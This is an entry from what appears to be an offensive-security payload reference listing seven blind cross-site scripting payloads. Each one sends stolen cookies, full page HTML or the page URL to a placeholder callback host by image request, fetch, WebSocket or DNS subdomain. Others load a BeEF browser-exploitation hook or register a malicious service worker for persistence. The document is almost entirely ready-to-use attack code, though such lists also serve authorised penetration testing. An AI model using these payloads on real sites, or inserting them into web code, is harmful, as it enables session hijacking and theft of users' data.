---
id: "xss-blind-payloads"
title: "XSS Payloads - Blind XSS Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "blind", "payload"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads for detecting XSS in contexts where you cannot see the output

## Payloads

### Image Exfiltration

Exfiltrate data via image request to external server

- **Contexts**: html, script
- **Severity**: high

```html
<script>new Image().src='http://CALLBACK_URL/xss?'+document.cookie</script>
```

### Fetch API Exfiltration

Use fetch API to send data to external server

- **Contexts**: script
- **Severity**: high

```html
fetch('http://CALLBACK_URL/xss', {method:'POST', body: document.documentElement.outerHTML})
```

### WebSocket Exfiltration

Use WebSocket to send real-time data

- **Contexts**: script
- **Severity**: high

```html
var ws=new WebSocket('ws://CALLBACK_URL/ws');ws.onopen=function(){ws.send(document.cookie)}
```

### DNS Exfiltration

Exfiltrate via DNS queries (subdomain)

- **Contexts**: script
- **Severity**: medium

```html
fetch('http://'+btoa(document.cookie)+'.CALLBACK_URL')
```

### BeEF Hook

Load BeEF (Browser Exploitation Framework) hook

- **Contexts**: html, script
- **Severity**: high

```html
<script src="http://CALLBACK_URL:3000/hook.js"></script>
```

### CSP Bypass Report

Trigger CSP violation report to exfiltrate data

- **Contexts**: script
- **Severity**: medium

```html
fetch('http://CALLBACK_URL/report',{method:'POST',body:JSON.stringify({url:location.href,cookies:document.cookie})})
```

### Service Worker Registration

Register malicious service worker for persistence

- **Contexts**: script
- **Severity**: high

```html
navigator.serviceWorker.register('http://CALLBACK_URL/sw.js').then(()=>fetch('http://CALLBACK_URL/registered'))
```
